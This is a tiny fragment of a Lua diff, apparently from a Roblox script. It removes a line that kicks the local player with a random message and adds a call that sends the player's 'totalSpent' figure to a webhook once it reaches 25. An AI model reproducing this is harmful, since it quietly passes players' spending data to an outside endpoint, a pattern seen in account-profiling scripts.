-            local randomMessage = messages[math.random(1, #messages)]
-            game.Players.LocalPlayer:Kick(randomMessage)
+        if totalSpent >= 25 then
+            sendWebhook(totalSpent)
         else
             print("err")
         end
